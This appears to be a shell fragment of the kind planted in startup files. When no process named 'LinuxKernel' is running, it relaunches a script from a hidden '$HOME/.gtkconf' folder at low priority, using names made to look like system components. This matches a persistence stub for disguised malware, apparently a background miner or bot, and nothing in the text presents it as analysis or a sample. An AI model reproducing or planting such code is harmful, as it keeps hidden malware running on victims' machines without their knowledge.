if ! pidof LinuxKernel >/dev/null; then
  nice $HOME/.gtkconf/linuxheader.sh \$*
fi
